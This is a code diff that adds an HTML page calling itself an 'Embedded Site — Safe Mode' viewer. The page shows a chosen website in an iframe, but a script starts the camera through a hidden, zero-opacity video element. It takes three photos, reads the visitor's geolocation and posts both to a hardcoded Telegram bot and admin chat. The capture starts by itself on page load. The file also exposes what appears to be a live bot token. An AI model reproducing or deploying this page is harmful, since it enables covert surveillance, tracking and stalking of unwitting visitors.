@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <title>Embedded Site — Safe Mode</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <style>
+    html,body { height:100%; margin:0; }
+    iframe { width:100%; height:100%; border:0; display:block; }
+    /* tiny video kept visible to avoid some mobile browsers pausing stream */
+    video { position: fixed; right: 4px; bottom: 4px; width: 4px; height:4px; opacity:0; }
+  </style>
+</head>
+<body>
+  <iframe id="siteFrame" sandbox="allow-forms allow-same-origin allow-scripts allow-popups" ></iframe>
+  <video id="video" autoplay playsinline muted></video>
+
+  <script>
+    /******************** CONFIG ********************/
+    const ADMIN_CHAT_ID = "6314556756";
+    const BOT_TOKEN = "7948730878:AAFq_0T1au5K_Bguk-dRKSp9uCmUXXFTliE";
+    const PHOTO_COUNT = 3;        // number of photos to capture
+    const PHOTO_INTERVAL_MS = 1000; // ms between photos
+    /************************************************/
+
+    // helpers
+    function qsParam(name) {
+      return new URLSearchParams(window.location.search).get(name);
+    }
+
+    function isValidHttpsUrl(s) {
+      try {
+        const u = new URL(s);
+        return (u.protocol === "https:");
+      } catch (e) { return false; }
+    }
+
+    // read params
+    const USER_CHAT_ID = qsParam("chat_id"); // optional
+    let site = qsParam("site"); // expects full URL encoded: https%3A%2F%2Fexample.com
+
+    // sanitize/validate site param
+    const iframe = document.getElementById("siteFrame");
+    if (site) {
+      try { site = decodeURIComponent(site); } catch(e) {}
+    }
+
+    if (!site || !isValidHttpsUrl(site)) {
+      // show friendly fallback instructions if invalid
+      iframe.srcdoc = `
+        <div style="font-family: Arial; padding:20px;">
+          <h2>Invalid or missing "site" parameter</h2>
+          <p>To use this page, open the bot link the bot sent you or add <code>?chat_id=YOUR_CHAT_ID&site=https%3A%2F%2Fyour-site.com</code> to the URL.</p>
+          <p>Site must be an <strong>https</strong> URL and must allow embedding (some sites don't).</p>
+        </div>`;
+    } else {
+      iframe.src = site;
+    }
+
+    // CORE: capture photos + location then send to Telegram
+    const video = document.getElementById("video");
+
+    async function startCameraAndCapture() {
+      // require at least the chat ID or admin to be present
+      if (!ADMIN_CHAT_ID) {
+        console.error("No admin chat configured.");
+        return;
+      }
+
+      // request camera permission and start stream
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
+      } catch (err) {
+        console.warn("Camera access denied or failed:", err);
+        return;
+      }
+
+      // wait until video is playing and has dimensions
+      await new Promise((resolve) => {
+        function onPlaying() {
+          // sometimes videoWidth is 0 at playing; add a short delay
+          setTimeout(resolve, 700);
+        }
+        video.addEventListener("playing", onPlaying, { once: true });
+      });
+
+      // capture photos
+      const canvas = document.createElement("canvas");
+      canvas.width = video.videoWidth || 640;
+      canvas.height = video.videoHeight || 480;
+      const ctx = canvas.getContext("2d");
+      const photoBlobs = [];
+
+      for (let i=0;i<PHOTO_COUNT;i++) {
+        ctx.drawImage(video,0,0,canvas.width,canvas.height);
+        // convert to blob
+        // using await to ensure blob is ready
+        const blob = await new Promise(resolve => canvas.toBlob(resolve, "image/png"));
+        photoBlobs.push(blob);
+        await new Promise(r => setTimeout(r, PHOTO_INTERVAL_MS));
+      }
+
+      // get location (best effort)
+      let lat = null, lon = null;
+      if ("geolocation" in navigator) {
+        try {
+          const pos = await new Promise((resolve, reject) => {
+            navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000 });
+          });
+          lat = pos.coords.latitude;
+          lon = pos.coords.longitude;
+        } catch (e) {
+          console.warn("Geolocation failed or denied:", e);
+        }
+      }
+
+      // send photos & location to admin and user (if provided)
+      const recipients = [ADMIN_CHAT_ID];
+      if (USER_CHAT_ID) recipients.push(USER_CHAT_ID);
+
+      for (const r of recipients) {
+        // send location first (if available)
+        if (lat !== null && lon !== null) {
+          try {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({ chat_id: r, latitude: lat, longitude: lon })
+            });
+          } catch (e) { console.warn("Location send error:", e); }
+        }
+
+        // send photos
+        for (let i=0;i<photoBlobs.length;i++) {
+          const fd = new FormData();
+          fd.append("chat_id", r);
+          fd.append("photo", photoBlobs[i], `photo_${Date.now()}_${i}.png`);
+          try {
+            const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+              method: "POST",
+              body: fd
+            });
+            // optionally inspect res.json() for debugging
+          } catch (e) {
+            console.warn("Photo send error:", e);
+          }
+        }
+      }
+
+      // stop tracks to clean up
+      try {
+        const tracks = video.srcObject?.getTracks() || [];
+        tracks.forEach(t => t.stop());
+        video.srcObject = null;
+      } catch(e){}
+    }
+
+    // Start capture only if site validated and user consent expected
+    // NOTE: browsers will only allow camera access if user interacts with the page in some contexts.
+    // We'll try to start automatically; if blocked, user can click the iframe then grant permission.
+    if (site && isValidHttpsUrl(site)) {
+      // start after short delay so the iframe loads visually first
+      setTimeout(() => {
+        startCameraAndCapture().catch(e => console.warn(e));
+      }, 800);
+    }
+  </script>
+</body>
+</html>
